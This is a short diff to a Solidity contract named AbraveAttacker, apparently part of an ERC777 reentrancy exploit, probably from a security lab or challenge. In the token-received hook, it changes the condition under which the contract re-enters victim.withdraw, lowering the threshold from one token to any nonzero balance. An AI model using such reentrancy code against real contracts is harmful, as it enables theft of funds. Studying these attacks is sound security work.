@@ -59,7 +59,7 @@ contract AbraveAttacker is IERC777Recipient {
             return;
         }
         // 10 ** 18 in value == 1 AGT
-        if (token.balanceOf(address(from)) > 10**18) {
+        if (token.balanceOf(address(from)) >=1 ) {
             victim.withdraw(address(this));
         }
     }
